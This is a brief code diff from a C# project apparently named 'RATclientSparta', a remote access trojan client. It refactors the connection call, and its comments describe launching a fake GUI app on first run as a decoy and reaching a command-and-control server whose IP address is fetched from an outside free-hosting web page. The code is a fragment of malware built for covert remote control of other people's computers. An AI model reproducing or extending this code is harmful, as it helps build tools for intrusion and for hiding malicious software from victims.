@@ -28,11 +28,8 @@ namespace RATclientSparta
                 //starts fake GUI app if first time program opened
                 Run.ProgramSetup();
 
-                //creates an instance of SocketClient class which trigger constructor
-                SocketServer SocketClient = new SocketServer();
-
                 //SocketClient instance connecting to server (ipaddress comes from https://mysimpleweb054.000webhostapp.com/mysite/detail)
-                SocketClient.Connect();
+                SocketServer.Connect();
             }
         }
 
